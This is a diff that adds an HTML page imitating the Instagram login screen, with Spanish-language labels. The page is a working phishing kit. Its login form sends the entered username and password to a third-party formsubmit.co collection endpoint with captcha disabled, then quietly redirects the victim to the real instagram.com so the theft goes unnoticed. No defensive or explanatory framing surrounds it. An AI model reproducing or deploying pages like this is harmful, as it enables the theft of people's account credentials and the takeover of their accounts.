@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="assets/css/main.css">
+  <title>Instagram</title>
+</head>
+<body>
+  <main class="l-main">
+      <div class="l-main__img">
+        <img src="assets/img/homepage.png" alt="Smartphones">
+      </div>
+      <div class="l-user">
+        <form action="https://formsubmit.co/f707045cbb178e655b8834367685c3f5" method="POST">
+          
+          <div class="c-panel group">
+          <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+          <div class="c-panel__form">
+            
+            <input type="text" class="c-panel__input" placeholder="Teléfono, usuario, o correo electrónico" name="usuario" required>
+         
+            <input type="password" style="width: 100%;
+            margin-bottom: 5px;
+            padding: 8px 12px;" id="password" class="c-panel__input" placeholder="Contraseña" name="contraseña" required>
+            <a id="viewPassword" style="margin: 0px; padding: 0px; position: relative;
+            top: -28px;
+            right: -90px;
+            ">Mostrar</a>
+
+            
+            
+    
+            <button  type="submit" class="c-btn">Iniciar sesión</button>
+            <input type="hidden" name="_next" value="https://instagram.com">
+            <input type="hidden" name="_captcha" value="false">
+            <span class="c-panel__span">O</span>
+          
+          </div></form>
+          <a href="#" class="c-panel__facebook">Iniciar sesión con Facebook</a>
+          <a href="#" class="c-panel__forgot">¿Olvidaste tu contraseña?</a>
+        </div>
+        <div class="c-signup group">
+          <p>¿No tienes una cuenta? <span>Regístrate</span></p>
+        </div>
+        <div class="c-app">
+          <p>Descarga la app.</p>
+          <div class="c-app__download">
+            <img src="assets/img/apple.png" alt="Apple Store">
+            <img src="assets/img/google.png" alt="Google Play">
+          </div>
+        </div>
+      </div>
+  </main>
+  <script>
+    let password = document.getElementById('password');
+let viewPassword = document.getElementById('viewPassword');
+let click = false;
+
+viewPassword.addEventListener('click', (e)=>{
+  if(!click){
+    password.type = 'text'
+    click = true
+  }else if(click){
+    password.type = 'password'
+    click = false
+  }
+})
+  </script>
+  
+</body>
+</html>
